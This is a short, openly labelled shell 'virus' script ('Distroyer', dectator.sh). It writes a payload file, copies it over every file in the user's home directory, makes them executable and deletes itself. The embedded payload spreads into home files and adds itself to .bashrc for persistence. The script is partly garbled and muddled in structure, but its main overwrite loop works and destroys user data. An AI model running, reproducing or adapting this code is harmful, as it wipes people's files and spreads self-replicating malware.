#!/system/bin/sh

echo Hello, World!
echo "Distroyer is here"

#Hello hacker is here

#!/bin/bash

# Define the virus
payload='#!/bin/bash

# Obfuscate the payload
obfuscated_payload=$(echo "$(cat <<'EOF'
#!/bin/bash

# Infect all files in the user's home directory
inject_files() {
    for file in $HOME/*; do
        if [ -f "$file" ] && [ ! -x "$file" ]; then
            cp "$0" "$file"
            chmod +x "$file"
        fi
    done
}

# Add the virus in the startup scripts
Add_to_startup() {
    startup_file="$HOME/.bashrc"
    if [ -f "$startup_file" ]; then
        echo "$0" >> "$startup_file"
    fi
}

# Run the payload
inject_files
Add_to_startup

# Self-destroyer
rm -- "$0"
EOF
)" | base64 -w0)")

# Decode and execute the obfuscated payload
echo "$obfuscated_payload" | base64 -d | bash
'

# Create the virus file
echo "$payload" > dectator.sh

# Copy the virus to all files in the user's home directory
for file in $HOME/*; do
    cp dectator.sh "$file"
done

# Make the copied files executable
chmod +x $HOME/*

# Self-destroyer
rm -- "$0"
